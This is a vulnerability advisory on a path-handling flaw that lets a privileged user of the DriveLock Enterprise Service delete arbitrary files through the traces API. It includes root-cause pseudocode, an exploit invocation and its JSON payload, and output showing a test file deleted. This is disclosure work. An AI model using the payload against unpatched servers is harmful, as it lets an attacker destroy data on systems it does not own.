---
layout: post_collection_entry
date:   2026-03-01
categories: [patch analysis]
advisory_collection: drivelock_multi_2026_patch_analysis

title:  "[PatchAnalysis - DriveLock] DriveLock Enterprise Service - Delete arbitrary files"
advisory:
  product: DriveLock
  homepage: https://www.drivelock.com/
  vulnerable_version: "< 25.2.4, < 25.1.7, < 24.2.9"
  fixed_version: "25.2.4, 25.1.7, 24.2.9"
  found: 2026-02-27
  cve: "ToDo"
  impact_text: HIGH
  impact_score: 6.5
  cvss: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H
---

# Product description
> The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside.
> This means you are secure at the centre, with all paths of access to your sensitive data blocked.

*Cite: [DriveLock - Homepage](https://www.drivelock.com/en/)*

This platform includes the `DriveLock Core` component, which is an agent installed on the client machines.

## Overview / Impact
An attacker can force the `DES` to delete arbitrary files on the filesystem, by using the `traces` API endpoint.

**Privileges Required**
* User required: `true`
* Permission: `PermissionType.TraceFiles_Write`

# Root Cause Analysis
The implementation of the `delete traces` endpoint `/api/administration/traceFiles/traces` uses the user provided data without sanitizing / validating it.
The value `request.TraceFiles[].name` is passed to the `Path.Combine` function to build the full path for the file which should be deleted. After building the path it is used in `System.IO.File.Delete` without further validation.

```c#
// FILE: EnterpriseServer.Administration/EnterpriseServer.Administration.Controller/TraceFilesController.cs

FUNCTION DeleteTraceFiles(request):

    // 1. Check permissions
    EnsureUserHasPermission("TraceFiles_Write", "Delete TraceFiles")
    // 2. Validate input
    IF request IS NULL OR request.TraceFiles IS NULL THEN
        RETURN BadRequest("No traces given")
    END IF
    // 3. Process each trace file
    FOR EACH traceFile IN request.TraceFiles DO
        basePath = GetPathForLocalTraces(
                        CurrentTenantFromToken(),
                        traceFile.Computer
                    )
        fullPath = CombinePath(basePath, traceFile.Name)

        IF FileExists(fullPath) THEN
            DeleteFile(fullPath)
        END IF
    END FOR
    // 4. Return success
    RETURN Ok()

END FUNCTION
```

# Proof of Concept / Exploit
Setup `JWT` environment var and run the included [PoC - arbitrary-delete](/assets/drivelock/poc/poc-arbitrary-delete.sh):
```sh
❯ export JWT="XXX"
❯ ./poc-arbitrary-delete.sh
```

## Exploit
The following demonstrates the usage of the exploit suite.

Pre-setup: create a file which can be deleted by the configured `DES` service user - eg. `drivelock.svc`.
```ps1
PS C:\temp> New-Item foobar.txt
    Directory: C:\temp
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        12/3/2025   9:33 AM              0 foobar.txt


PS C:\temp> icacls "foobar.txt" /grant "Users:(F)" /T
processed file: foobar.txt
Successfully processed 1 files; Failed processing 0 files
PS C:\temp> ls
    Directory: C:\temp
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        12/3/2025   9:33 AM              0 foobar.txt
-a----        11/3/2025   8:54 PM     1426724864 SQLServer2019-x64-ENU-Dev.iso
-a----        11/3/2025   9:11 PM      495847104 SSMS-Setup-ENU.exe

```

Running the exploit:
```bash
❯ uv run -m drivelock.exploit --tenant doetess -u stuxxn -P '!23456Qwertz' deleteFile 'C:\\temp\\foobar.txt'
[INFO] URL: https://192.168.60.10:4568/api/administration/auth/login
[INFO] Login as - tenant: doetess, user: stuxxn
[INFO] Setup JWT for http.client
[DEBUG] Token: XXX
[INFO] URL: https://192.168.60.10:4568/api/administration/traceFiles/traces
[INFO] Payload: {'TraceFiles': [{'computer': '', 'name': 'C:\\temp\\foobar.txt'}]}
```

```ps1
PS C:\temp> # After running the exploit
PS C:\temp> ls
    Directory: C:\temp
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/3/2025   8:54 PM     1426724864 SQLServer2019-x64-ENU-Dev.iso
-a----        11/3/2025   9:11 PM      495847104 SSMS-Setup-ENU.exe
```

# Solution
Patch for version 25.2, 25.1 and 24.2 were published on 2026-02-20, which fixes the vulnerability.
Patched versions:

    25.2.4
    25.1.7
    24.2.9

No other mitigations are known.